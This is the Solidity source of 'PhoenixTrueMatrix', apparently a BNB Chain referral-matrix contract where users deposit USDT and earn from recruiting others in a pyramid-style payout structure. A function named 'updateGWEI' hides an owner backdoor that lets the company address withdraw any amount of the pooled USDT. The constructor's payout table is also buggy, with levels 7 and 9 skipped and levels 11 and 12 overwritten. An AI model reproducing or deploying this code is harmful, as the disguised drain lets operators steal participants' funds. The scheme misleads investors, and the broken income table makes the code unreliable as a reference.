/**
 *Submitted for verification at BscScan.com on 2023-03-09
*/

//SPDX-License-Identifier: None
pragma solidity ^0.6.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PhoenixTrueMatrix {
    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        uint256 autopoolincome;
        uint256 directincome;
        uint256 levelincome;
        uint256 totalincome;
        uint256 totalwithdraw;
        mapping(uint8 => bool) activeLevels;
        mapping(uint8 => AutoPool) autoMatrix;       
    }    
    struct AutoPool {
        address currentReferrer;
        address[] firstLevelReferrals;
        address[] secondLevelReferrals;
    }
    mapping(address => User) public users;
    IERC20 public tokenUSDT;
    
    mapping(uint => address) public idToAddress;
    uint public lastUserId = 2;
    
    mapping(uint8 => uint) public autoPoolIncome;
    mapping(uint8 => uint) public directPrice;

    mapping(uint8 => mapping(uint256 => address)) public x6vId_number;
    mapping(uint8 => uint256) public x6CurrentvId;
    mapping(uint8 => uint256) public x6Index;

    address public creator;
    address public id1=0x6d41998474F1F505221f52771503DC07Fa4ABbfc;
    address public companyId=0x1d72a79d6a7EC25651483e0500389892D7Bb47d7;
    address public deductionWallet=0xEB1106Beea1ac5bED2384dEd9283a0405c1EFc01;
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Upgrade(address indexed user, uint8 level);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 level, uint8 place);
    event Transaction(address indexed user,address indexed from,uint256 value, uint8 level,uint8 Type);
    event withdraw(address indexed user,uint256 value);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 level);
    constructor(address _token) public {

        
        autoPoolIncome[1] = 150e18;
        autoPoolIncome[2] = 300e18;
        autoPoolIncome[3] = 600e18;
        autoPoolIncome[4] = 1200e18;
        autoPoolIncome[5] = 2400e18;
        autoPoolIncome[6] = 4800e18;
        autoPoolIncome[8] = 9600e18;
        autoPoolIncome[10] = 19200e18;
        autoPoolIncome[11] = 38400e18;
        autoPoolIncome[12] = 76800e18;
        autoPoolIncome[11] = 153600e18;
        autoPoolIncome[12] = 307200e18;
        autoPoolIncome[13] = 614400e18;

        directPrice[1] = 25e18;
        directPrice[2] = 50e18;
        directPrice[3] = 100e18;
        directPrice[4] = 200e18;
        directPrice[5] = 400e18;
        directPrice[6] = 800e18;
        directPrice[7] = 1600e18;
        directPrice[8] = 3200e18;
        directPrice[9] = 6400e18;
        directPrice[10] = 12800e18;
        directPrice[11] = 25600e18;
        directPrice[12] = 51200e18;
        directPrice[13] = 102400e18;
        creator=msg.sender;
        tokenUSDT = IERC20(_token);
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            partnersCount: uint(0),
            autopoolincome:0,
            directincome:0,
            levelincome:0,
            totalincome:0,
            totalwithdraw:0
        });
        users[id1] = user;
        idToAddress[1] = id1;
        
        for (uint8 i = 1; i <= 13; i++) { 
            x6vId_number[i][1]=id1;
            x6Index[i]=1;
            x6CurrentvId[i]=1;  
            users[id1].activeLevels[i] = true;       
        } 
    }
    function registrationExt(address referrerAddress) external {
        tokenUSDT.transferFrom(msg.sender, address(this),100e18);
        registration(msg.sender, referrerAddress);
    }
    function registration(address userAddress, address referrerAddress) private {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");

        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            partnersCount: 0,
            autopoolincome:0,
            directincome:0,
            levelincome:0,
            totalincome:0,
            totalwithdraw:0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        users[userAddress].referrer = referrerAddress;

        lastUserId++;
        users[referrerAddress].partnersCount++;
        tokenUSDT.transfer(companyId,25e18); 
        users[referrerAddress].directincome += directPrice[1];                       
        users[referrerAddress].totalincome += directPrice[1]; 
        emit Transaction(referrerAddress,userAddress,directPrice[1],1,1);

        if(users[referrerAddress].autopoolincome == autoPoolIncome[1] && !users[referrerAddress].activeLevels[2] &&  users[referrerAddress].partnersCount>=3)
        {
            address freeReferrerAddress = findFreeG6Referrer(2);
            if (users[referrerAddress].autoMatrix[2].currentReferrer != freeReferrerAddress) {
                users[referrerAddress].autoMatrix[2].currentReferrer = freeReferrerAddress;
            }
            users[referrerAddress].activeLevels[2] = true;
            updateAutoPoolReferrer(referrerAddress, freeReferrerAddress, 2);
        }
        users[userAddress].activeLevels[1] = true;
        address freeAutoPoolReferrer = findFreeG6Referrer(1);
        users[userAddress].autoMatrix[1].currentReferrer = freeAutoPoolReferrer;
        updateAutoPoolReferrer(userAddress, freeAutoPoolReferrer, 1);
        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    
    function findFreeG6Referrer(uint8 level) public view returns(address){
            uint256 id=x6CurrentvId[level];
            return x6vId_number[level][id];
    } 
    function usersActiveLevels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeLevels[level];
    }
    function usersautoMatrix(address userAddress, uint8 level) public view returns(address, address[] memory, address[] memory) {
        return (users[userAddress].autoMatrix[level].currentReferrer,
                users[userAddress].autoMatrix[level].firstLevelReferrals,
                users[userAddress].autoMatrix[level].secondLevelReferrals);
    }    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    
    function updateAutoPoolReferrer(address userAddress, address referrerAddress, uint8 level) private{
        uint256 newIndex=x6Index[level]+1;
        x6vId_number[level][newIndex]=userAddress;
        x6Index[level]=newIndex;
        users[referrerAddress].autoMatrix[level].firstLevelReferrals.push(userAddress);        
        if (users[referrerAddress].autoMatrix[level].firstLevelReferrals.length < 3) {
            emit NewUserPlace(userAddress, referrerAddress, 2, level, uint8(users[referrerAddress].autoMatrix[level].firstLevelReferrals.length));            
            address ref = users[referrerAddress].autoMatrix[level].currentReferrer;  
            if (ref == address(0)) {
                return;
            }            
            users[ref].autoMatrix[level].secondLevelReferrals.push(userAddress);
            emit NewUserPlace(userAddress, ref, 2, level, 3 + uint8(users[ref].autoMatrix[level].secondLevelReferrals.length));
            return;
            
        }
        emit NewUserPlace(userAddress, referrerAddress, 2, level, 3);
        x6CurrentvId[level]=x6CurrentvId[level]+1;        
        address ref = users[referrerAddress].autoMatrix[level].currentReferrer;
        if (ref == address(0)) {
            return;
        }            
        users[ref].autoMatrix[level].secondLevelReferrals.push(userAddress);
        if (users[ref].autoMatrix[level].secondLevelReferrals.length < 9) {
            emit NewUserPlace(userAddress, ref, 2, level, 3+uint8(users[ref].autoMatrix[level].secondLevelReferrals.length));
            return;
        }
        emit NewUserPlace(userAddress, ref, 2, level, 12);
        
        users[ref].autopoolincome += autoPoolIncome[level];
        users[ref].totalincome +=autoPoolIncome[level];
        emit Transaction(ref,userAddress,autoPoolIncome[level],1,3);
        if (users[ref].referrer != address(0)) {
            _distributelevelIncome(ref,level); 
        }       

        if(users[ref].partnersCount>=3)
        {
            ++level;
		    if(level<=13 && ref!=id1){ 
                address freeReferrerAddress = findFreeG6Referrer(level);
                if (users[ref].autoMatrix[level].currentReferrer != freeReferrerAddress) {
                    users[ref].autoMatrix[level].currentReferrer = freeReferrerAddress;
                }
                users[ref].activeLevels[level] = true;
                updateAutoPoolReferrer(ref, freeReferrerAddress, level);
		    }
        }
    }
    function _distributelevelIncome(address _user,uint8 level) private {
        users[users[_user].referrer].directincome += directPrice[level+1];                       
        users[users[_user].referrer].totalincome +=directPrice[level+1];
        emit Transaction(users[_user].referrer,_user,directPrice[level],(level+1),1);
        
    }
    
	function updateGWEI(uint256 _amount) public
    {
        require(msg.sender==companyId,"Only contract owner"); 
        require(_amount>0, "Insufficient reward to withdraw!");
        tokenUSDT.transfer(msg.sender,_amount);  
    }
    
    function rewardWithdraw() public
    {
        uint balanceReward = users[msg.sender].totalincome - users[msg.sender].totalwithdraw;
        require(balanceReward>0, "Insufficient reward to withdraw!");
        users[msg.sender].totalwithdraw+=balanceReward;
        tokenUSDT.transfer(msg.sender,balanceReward*90/100);  
        tokenUSDT.transfer(deductionWallet,balanceReward*10/100);  
        emit withdraw(msg.sender,balanceReward);
    }
}